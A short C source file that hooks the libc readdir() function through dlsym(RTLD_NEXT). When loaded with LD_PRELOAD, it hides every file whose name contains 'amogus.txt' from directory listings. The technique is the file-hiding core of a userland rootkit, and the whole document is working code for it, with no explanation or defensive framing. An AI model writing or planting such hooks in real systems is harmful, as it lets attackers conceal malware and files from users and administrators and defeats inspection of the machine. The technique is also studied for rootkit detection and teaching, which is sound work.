#include <dlfcn.h>
#include <dirent.h>
#include <string.h>

#define FILENAME "amogus.txt"

struct dirent *(*orig_readdir)(DIR *);

struct dirent *readdir(DIR *d) {
	struct dirent *ret;

	orig_readdir = dlsym(RTLD_NEXT, "readdir");
	if (!orig_readdir)
		return NULL;

	while ((ret = orig_readdir(d))) {
		if (!strstr(ret->d_name, FILENAME))
			break;
	}

	return ret;
}
